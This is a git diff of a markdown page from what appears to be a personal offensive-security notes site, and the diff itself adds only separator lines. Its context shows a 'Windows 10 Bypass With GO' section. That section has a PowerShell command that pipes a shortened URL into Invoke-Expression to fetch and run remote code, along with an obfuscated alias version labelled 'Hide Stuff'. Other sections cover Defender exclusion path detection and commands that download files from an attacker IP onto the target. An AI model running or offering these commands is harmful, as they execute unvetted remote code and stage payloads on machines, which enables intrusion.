@@ -3,6 +3,9 @@
 icon: fas fa-subway
 order: 6
 ---
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 #  🖥️ Windows 10 Bypass With GO 
 Video Explaination [here](https://youtu.be/zM8EVJdErsc?si=uGHzpHG8HMlHIfjZ)
 ### nano pleasesubscribe.go
@@ -37,6 +40,8 @@ Invoke-RestMethod is.gd/Q2Katq | Invoke-Expression
 # Hide Stuff
 & (gal ir?) is.gd/Q2Katq |& (gal i?x)
 ```
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # 💭  Defender Exclusion Path Detection
 [John Hammand Video ](https://youtu.be/fxO1V0mzePQ?si=DkA5820pjg2F47pV)
@@ -74,6 +79,8 @@ Write-Output "Your Public IPv6 Address : $pubIPv6"
 ```elixir
 "Your IPv4 is: $(irm api.ipify.org)"; "Your IPv6 is: $(irm api64.ipify.org)"    # irm= invoke Rest Method 
 ```
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 #  🗃️ File Transfer
 ```elixir
@@ -120,6 +127,8 @@ powershell "iwr -Uri http://${YOUR_KALI_IP_ADDRESS}:$port/file -OutFile C:/Windo
 
 powershell -NoProfile -Command "$ip='$Attacker_IP'; iwr http://$ip:$port/file -OutFile $env:TEMP\file; Get-Content $env:TEMP\file"
 ```
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Some Python Automation...
 ```bash
